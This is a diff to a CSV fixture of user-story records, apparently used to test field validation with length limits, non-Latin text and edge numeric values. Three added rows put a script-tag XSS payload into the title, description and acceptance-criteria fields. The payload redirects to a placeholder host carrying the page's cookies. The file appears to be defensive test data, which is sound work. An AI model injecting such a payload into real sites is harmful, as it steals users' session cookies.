@@ -6,19 +6,24 @@ user-story-04,Filler title of user story to reach seventy five characters in an 
 user-story-05,貸んい建濯よ芝弾テソ,Description 1,11,Acceptance criteria 1,MUST,https://link1.com,manager-01,project-01
 user-story-06,Λορεμ ιπσθμ δολορ σιτ αμετ,Description 1,11,Acceptance criteria 1,MUST,https://link1.com,manager-01,project-02
 user-story-07,коза коза,Description 1,11,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-04
-user-story-08,Title 1,a,11,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-04
-user-story-09,Title 1,Filler description to reach one hundred (100) characters in attribute description of the user story.,11,Acceptance criteria 1,MUST,https://link1.com,manager-01,project-05
-user-story-10,Title 1,Λορεμ ιπσθμ δολορ σιτ αμετ,11,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
-user-story-11,Title 1,Description 1,0,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
-user-story-12,Title 1,Description 1,1,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
-user-story-13,Title 1,Description 1,100,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
-user-story-14,Title 1,Description 1,199,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
-user-story-15,Title 1,Description 1,200,Acceptance criteria 1,MUST,https://link1.com,manager-01,project-10
-user-story-16,Title 1,Description 1,11,a,MUST,https://link1.com,manager-01,project-10
-user-story-17,Title 1,Description 1,11,Filler acceptance criteria to reach one hundred (100) characters in same attribute of an user story.,MUST,https://link1.com,manager-01,project-10
-user-story-18,Title 1,Description 1,11,Λορεμ ιπσθμ δολορ σιτ αμετ,MUST,https://link1.com,manager-01,project-10
-user-story-19,Title 1,Description 1,11,Acceptance criteria 1,SHOULD,https://link1.com,manager-01,project-10
-user-story-20,Title 1,Description 1,11,Acceptance criteria 1,COULD,https://link1.com,manager-01,project-10
-user-story-21,Title 1,Description 1,11,Acceptance criteria 1,WONT,https://link1.com,manager-02,project-15
-user-story-22,Title 1,Description 1,11,Acceptance criteria 1,MUST,https://fillerURL.com/255characters/maxLength/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,manager-01,project-18
-user-story-23,Title 1,Description 1,11,Acceptance criteria 1,MUST,null,manager-01,project-18
+user-story-08,<script> window.location = ‘https://example.com/?user_data=’ + document.cookies; </script>,Description 1,11,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-04
+user-story-09,Title 1,a,11,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-04
+user-story-10,Title 1,Filler description to reach one hundred (100) characters in attribute description of the user story.,11,Acceptance criteria 1,MUST,https://link1.com,manager-01,project-05
+user-story-11,Title 1,Λορεμ ιπσθμ δολορ σιτ αμετ,11,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
+user-story-12,Title 1,貸んい建濯よ芝弾テソ,11,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
+user-story-13,Title 1,<script> window.location = ‘https://example.com/?user_data=’ + document.cookies; </script>,11,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
+user-story-14,Title 1,Description 1,0,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
+user-story-15,Title 1,Description 1,1,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
+user-story-16,Title 1,Description 1,100,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
+user-story-17,Title 1,Description 1,199,Acceptance criteria 1,MUST,https://link1.com,manager-02,project-06
+user-story-18,Title 1,Description 1,200,Acceptance criteria 1,MUST,https://link1.com,manager-01,project-10
+user-story-19,Title 1,Description 1,11,a,MUST,https://link1.com,manager-01,project-10
+user-story-20,Title 1,Description 1,11,Filler acceptance criteria to reach one hundred (100) characters in same attribute of an user story.,MUST,https://link1.com,manager-01,project-10
+user-story-21,Title 1,Description 1,11,Λορεμ ιπσθμ δολορ σιτ αμετ,MUST,https://link1.com,manager-01,project-10
+user-story-22,Title 1,Description 1,11,貸んい建濯よ芝弾テ,MUST,https://link1.com,manager-01,project-10
+user-story-23,Title 1,Description 1,11,<script> window.location = ‘https://example.com/?user_data=’ + document.cookies; </script>,MUST,https://link1.com,manager-01,project-10
+user-story-24,Title 1,Description 1,11,Acceptance criteria 1,SHOULD,https://link1.com,manager-01,project-10
+user-story-25,Title 1,Description 1,11,Acceptance criteria 1,COULD,https://link1.com,manager-01,project-10
+user-story-26,Title 1,Description 1,11,Acceptance criteria 1,WONT,https://link1.com,manager-02,project-15
+user-story-27,Title 1,Description 1,11,Acceptance criteria 1,MUST,https://fillerURL.com/255characters/maxLength/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,manager-01,project-20
+user-story-28,Title 1,Description 1,11,Acceptance criteria 1,MUST,,manager-01,project-20
